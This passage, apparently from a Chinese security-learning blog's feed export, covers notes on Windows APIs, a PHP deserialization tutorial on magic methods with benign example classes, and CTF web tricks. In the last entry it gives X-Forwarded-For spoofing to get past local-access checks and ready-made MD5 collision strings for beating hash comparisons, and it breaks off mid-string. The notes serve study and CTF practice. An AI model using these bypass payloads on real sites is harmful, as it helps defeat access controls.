id="易语言的窗口特征ID"><a href="#易语言的窗口特征ID" class="headerlink" title="易语言的窗口特征ID"></a>易语言的窗口特征ID</h4><p>看到004012AC这句代码 PUSH  5201008了吗<br>PUSH 10001，告诉你，这个是易语言通用的，每个窗口ID语句上面都会有一个PUSH 10001</p><h4 id="Openfile"><a href="#Openfile" class="headerlink" title="Openfile"></a>Openfile</h4><p>打开文件的api构建，用到再说</p><h4 id="GetDlgItemInt"><a href="#GetDlgItemInt" class="headerlink" title="GetDlgItemInt"></a>GetDlgItemInt</h4><p>将获取的文本转化为整数</p><h4 id="SetWindowsTextA"><a href="#SetWindowsTextA" class="headerlink" title="SetWindowsTextA"></a>SetWindowsTextA</h4><p>将某个窗口或者字段中的文字进行设定所调用的api窗口哦</p><h3 id="主要的dll"><a href="#主要的dll" class="headerlink" title="主要的dll"></a>主要的dll</h3><p>看样子我后面还要了解一下，这些api在那些dll里面了</p><p>kernel32.dll、user32.dll、gdi32.dll</p>]]></content>
    
    
    <categories>
      
      <category>逆向</category>
      
    </categories>
    
    
    <tags>
      
      <tag>reverse</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>web反序列化</title>
    <link href="/2024/09/27/web%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2024/09/27/web%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<p>本人在学习php反序列化时，深感无力，发现并不能将发序列化作为一个小点，要从php底层开始理解</p><p>先了解一下php的魔术方法</p><blockquote><p>__construct()类的构造函数，在类实例化对象时自动调用构造函数<br>__destruct()类的析构函数，在对象销毁之前自动调用析构函数<br>__sleep()在对象被序列化（使用 serialize() 函数）之前自动调用，可以在此方法中指定需要被序列化的属性，返回一个包含对象中所有应被序列化的变量名称的数组<br>__wakeup()在对象被反序列化（使用 unserialize() 函数）之前自动调用，可以在此方法中重新初始化对象状态。<br>__set($property, $value)当给一个对象的不存在或不可访问(private修饰)的属性赋值时自动调用，传递属性名和属性值作为参数。<br>__get($property)当访问一个对象的不存在或不可访问的属性时自动调用，传递属性名作为参数。<br>__isset($property)当对一个对象的不存在或不可访问的属性使用 isset() 或 empty() 函数时自动调用，传递属性名作为参数。<br>__unset($property)当对一个对象的不存在或不可访问的属性使用 unset() 函数时自动调用，传递属性名作为参数。<br>__call($method, $arguments)调用不存在或不可见的成员方法时，PHP会先调用__call()方法来存储方法名及其参数<br>__callStatic($method, $arguments)当调用一个静态方法中不存在的方法时自动调用，传递方法名和参数数组作为参数。<br>__toString()当使用echo或print输出对象将对象转化为字符串形式时，会调用__toString()方法<br>__invoke()当将一个对象作为函数进行调用时自动调用。<br>__clone()当使用 clone 关键字复制一个对象时自动调用。<br>__set_state($array)在使用 var_export() 导出类时自动调用，用于返回一个包含类的静态成员的数组。<br>__debugInfo()在使用 var_dump() 打印对象时自动调用，用于自定义对象的调试信息。</p></blockquote><p>1.__construct<br>构造函数 __construct在实例化对象时便会自动执行该方法  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;触发了构造函数1次&quot;</span> ;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;benben&quot;</span>);    <span class="hljs-comment">//实例化对象时触发构造函数__construct()</span><br><span class="hljs-variable">$ser</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$test</span>);       <span class="hljs-comment">//在序列化和反序列化过程中不会触发构造函数</span><br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$ser</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>2.__destruct()<br>析构函数__destruct,在对象被销毁时自动执行该方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;触发了析构函数1次&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;benben&quot;</span>);  <span class="hljs-comment">//实例化对象结束后，代码运行完会销毁，触发析构函数_destruct()</span><br><span class="hljs-variable">$ser</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$test</span>);     <span class="hljs-comment">//在序列化过程中不会触发</span><br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$ser</span>);           <span class="hljs-comment">//在反序列化过程中会触发，反序列化得到的是对象，用完后会销毁，触发析构函数_destruct()</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>以上代码总共触发两次析构函数，第一次为实例化对象后，代码运行完会，对象会被销毁，触发析构函数_destruct()；第二次在反序列化过程中会触发，反序列化得到的是对象，用完后会销毁，触发析构函数_destruct()</p></blockquote><p>3.__sleep()</p><blockquote><p>在进行序列化时，serialize()函数会检查类中是否存在一个魔术方法__sleep()。如果存在，该方法会先被调用，可以在此方法中指定需要被序列化的属性，返回一个包含对象中所有应被序列化的变量名称的数组。然后才执行序列化操作。<br>此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。如果该方法未返回任何内容，则 NULL 被序列化，并产生一个 E_NOTICE级别的错误。</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">SITE</span> = <span class="hljs-string">&#x27;uusama&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$nickname</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>, <span class="hljs-variable">$nickname</span>, <span class="hljs-variable">$password</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;nickname = <span class="hljs-variable">$nickname</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-variable">$password</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__sleep</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;username&#x27;</span>, <span class="hljs-string">&#x27;nickname&#x27;</span>);      <span class="hljs-comment">//sleep执行返回需要序列化的属性名，过滤掉password变量</span><br>    &#125;<br>&#125;<br><span class="hljs-variable">$user</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&#x27;c&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$user</span>);      <span class="hljs-comment">//serialize()只序列化sleep返回的变量，序列化之后的字符串：O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:1:&quot;a&quot;;s:8:&quot;nickname&quot;;s:1:&quot;b&quot;;&#125;</span><br><span class="hljs-comment">//</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>4.__wakeup()</p><blockquote><p>在进行反序列化时，unserialize()会检查是否存在一个魔术方法__wakeup()，如果存在，则会先调用__wakeup方法，做一些初始化工作。<br>使用__wakeup方法的原因是为了重建在序列化中可能丢失的数据库连接，或者执行其它初始化操作。</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">SITE</span> = <span class="hljs-string">&#x27;uusama&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$nickname</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$order</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-variable language_">$this</span>-&gt;username;       <span class="hljs-comment">//反序列化之前触发_wakeup(),给password赋值</span><br>    &#125;<br>&#125;<br><span class="hljs-variable">$user_ser</span> = <span class="hljs-string">&#x27;O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:1:&quot;a&quot;;s:8:&quot;nickname&quot;;s:1:&quot;b&quot;;&#125;&#x27;</span>;    <span class="hljs-comment">// 字符串中并没有password</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$user_ser</span>));   <span class="hljs-comment">// object(User)#1 (4) &#123; [&quot;username&quot;]=&gt; string(1) &quot;a&quot; [&quot;nickname&quot;]=&gt; string(1) &quot;b&quot; [&quot;password&quot;:&quot;User&quot;:private]=&gt; string(1) &quot;a&quot; [&quot;order&quot;:&quot;User&quot;:private]=&gt; NULL &#125; </span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>__wakeup()在反序列化unserialize()之前被调用<br>__destruct()在反序列化unserialize()之后被调用</p></blockquote><p>5.__toString()</p><blockquote><p>当使用echo或print输出对象将对象转化为字符串形式，或者将一个“对象”与“字符串”进行拼接时，会调用__toString()方法</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$benben</span> = <span class="hljs-string">&quot;this is test!!&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;格式不对，输出不了!&#x27;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>() ;     <span class="hljs-comment">// 把类User实体化并赋值给$test，此时$test是个对象</span><br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$test</span>);          <span class="hljs-comment">// 打印输出对象可以使用print_r或者var_dump，该对象输出后为：User Object(    [benben] =&gt; this is test!!)</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$test</span>;              <span class="hljs-comment">// 如果使用echo或者print只能调用字符串的方式去调用对象，即把对象当成字符串使用，此时自动触发toString()</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>6.__invoke()<br>当将一个对象作为函数进行调用时会触发__invoke()函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$benben</span> = <span class="hljs-string">&quot;this is test!!&quot;</span>;<br>         <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">         </span>&#123;<br>             <span class="hljs-keyword">echo</span>  <span class="hljs-string">&#x27;它不是个函数!&#x27;</span>;<br>          &#125;<br>&#125;<br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>() ;     <span class="hljs-comment">//把类User实例化为对象并赋值给$test</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$test</span> -&gt;benben;     <span class="hljs-comment">//正常输出对象里的值benben</span><br><span class="hljs-variable">$test</span>();                 <span class="hljs-comment">//加()是把test当成函数test()来调用，此时触发_invoke()</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>7.__call()<br>当调用不存在或不可见的成员方法时，PHP会先调用__call()方法来存储方法名及其参数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span>,<span class="hljs-variable">$arg2</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$arg1</span>,<span class="hljs-subst">$arg2</span>[0]&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>() ;<br><span class="hljs-variable">$test</span> -&gt; <span class="hljs-title function_ invoke__">callxxx</span>(<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>); <span class="hljs-comment">//调用的方法callxxx()不存在,触发魔术方法call(),传参(callxxx,a);$arg1:调用的不存在的方法的名称;$arg2:调用的不存在的方法的参数；</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>__call(string $function_name, array $arguments)该方法有两个参数，第一个参数 $function_name 会自动接收不存在的方法名，第二个 $arguments 则以数组的方式接收不存在方法的多个参数</p></blockquote><p>8.__callStatic()<br>当调用不存在或不可见的静态方法时，会自动调用__callStatic()方法，传递方法名和参数数组作为参数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__callStatic</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span>,<span class="hljs-variable">$arg2</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$arg1</span>,<span class="hljs-subst">$arg2</span>[0]&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>() ;<br><span class="hljs-variable">$test</span>::<span class="hljs-title function_ invoke__">callxxx</span>(<span class="hljs-string">&#x27;a&#x27;</span>);        <span class="hljs-comment">//静态调用使用&quot;::&quot;，静态调用方法callxxx()，由于其不存在，所以触发__callStatic，传参(callxxx,a)，输出：callxxx,a</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>9.__set()<br>__set($name, $value)函数，给一个对象的不存在或不可访问(private修饰)的属性赋值时，PHP就会执行__set()方法。__set()方法包含两个参数，$name表示变量名称，$value表示变量值，两个参数不可省略。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span> ,<span class="hljs-variable">$arg2</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span>  <span class="hljs-variable">$arg1</span>.<span class="hljs-string">&#x27;,&#x27;</span>.<span class="hljs-variable">$arg2</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>() ;<br><span class="hljs-variable">$test</span>-&gt;var2=<span class="hljs-number">1</span>;        <span class="hljs-comment">//给不存在的成员属性var2赋值为1，自动触发__set()方法；如果有__get(),先调用__get(),再调用__set()，输出：var2,1</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>10.__get()<br>__get($name)函数，当程序访问一个未定义或不可见的成员变量时，PHP就会执行 __get()方法来读取变量值。__get()方法有一个参数，表示要调用的变量名</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span>  <span class="hljs-variable">$arg1</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>() ;<br><span class="hljs-variable">$test</span> -&gt;var2;         <span class="hljs-comment">//调用的成员属性var2不存在，触发__get(),把不存在的属性的名称var2赋值给$arg1，输出：var2</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>11.__isset()<br>当对一个对象的不存在或不可访问的属性使用 isset() 或 empty() 函数时自动调用，传递属性名作为参数。__isset()方法有一个参数，表示要调用的变量名</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$var</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__isset</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">echo</span>  <span class="hljs-variable">$arg1</span>;<br>        &#125;<br>    &#125;<br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>() ;<br><span class="hljs-keyword">isset</span>(<span class="hljs-variable">$test</span>-&gt;<span class="hljs-keyword">var</span>);       <span class="hljs-comment">// 调用的成员属性var不可访问，并对其使用isset()函数或empty()函数，触发__isset()，输出：var</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>12.__unset()<br>当对一个对象的不存在或不可访问的属性使用 unset() 函数时自动调用，传递属性名作为参数。__unset()方法有一个参数，表示要调用的变量名</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$var</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__unset</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span> </span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">echo</span>  <span class="hljs-variable">$arg1</span>;<br>        &#125;<br>    &#125;<br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>() ;<br><span class="hljs-keyword">unset</span>(<span class="hljs-variable">$test</span>-&gt;<span class="hljs-keyword">var</span>);        <span class="hljs-comment">// 调用的成员属性var不可访问，并对其使用unset()函数，触发__unset()，输出：var</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>.13 __clone()<br>当对象被复制执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$var</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__clone</span>(<span class="hljs-params"> </span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">echo</span>  <span class="hljs-string">&quot;__clone test&quot;</span>;<br>        &#125;<br>    &#125;<br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>() ;<br><span class="hljs-variable">$newclass</span> = <span class="hljs-keyword">clone</span>(<span class="hljs-variable">$test</span>)        <span class="hljs-comment">// __clone test</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>网络</category>
      
    </categories>
    
    
    <tags>
      
      <tag>php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>od命令</title>
    <link href="/2024/09/20/od%E5%91%BD%E4%BB%A4/"/>
    <url>/2024/09/20/od%E5%91%BD%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>web简单利用</title>
    <link href="/2024/09/18/web%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8/"/>
    <url>/2024/09/18/web%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p>最近写一些垃圾web用到了不知道的知识，在此记录，首先是头文件绕过</p><blockquote><p>X-Forwarded-For : 简称XFF头，它代表客户端，也就是HTTP的 请求端真实的IP ，只有在通过了HTTP 代理或者负载均衡服务器时才会添加该项</p></blockquote><p>可以实现对web对本地的访问达到网址绕过的效果</p><h4 id="md5绕过"><a href="#md5绕过" class="headerlink" title="md5绕过"></a>md5绕过</h4><h5 id="相同的md5字符串"><a href="#相同的md5字符串" class="headerlink" title="相同的md5字符串"></a>相同的md5字符串</h5><p>a&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2<br>&amp;b&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</p><p>Param1&#x3D;M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2</p><p>Param2&#x3D;M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</p><p>$data1&#x3D;”\xd1\x31\xdd\x02\xc5\xe6\xee\xc4\x69\x3d\x9a\x06\x98\xaf\xf9\x5c\x2f\xca\xb5\x07\x12\x46\x7e\xab\x40\x04\x58\x3e\xb8\xfb\x7f\x89\x55\xad\x34\x06\x09\xf4\xb3\x02\x83\xe4\x88\x83\x25\xf1\x41\x5a\x08\x51\x25\xe8\xf7\xcd\xc9\x9f\xd9\x1d\xbd\x72\x80\x37\x3c\x5b\xd8\x82\x3e\x31\x56\x34\x8f\x5b\xae\x6d\xac\xd4\x36\xc9\x19\xc6\xdd\x53\xe2\x34\x87\xda\x03\xfd\x02\x39\x63\x06\xd2\x48\xcd\xa0\xe9\x9f\x33\x42\x0f\x57\x7e\xe8\xce\x54\xb6\x70\x80\x28\x0d\x1e\xc6\x98\x21\xbc\xb6\xa8\x83\x93\x96\xf9\x65\xab\x6f\xf7\x2a\x70”;<br>$data2&#x3D;”\xd1\x31\xdd\x02\xc5\xe6\xee\xc4\x69\x3d\x9a\x06\x98\xaf\xf9\x5c\x2f\xca\xb5\x87\x12\x46\x7e\xab\x40\x04\x58\x3e\xb8\xfb\x7f\x89\x55\xad\x34\x06\x09\xf4\xb3\x02\x83\xe4\x88\x83\x25\x71\x41\x5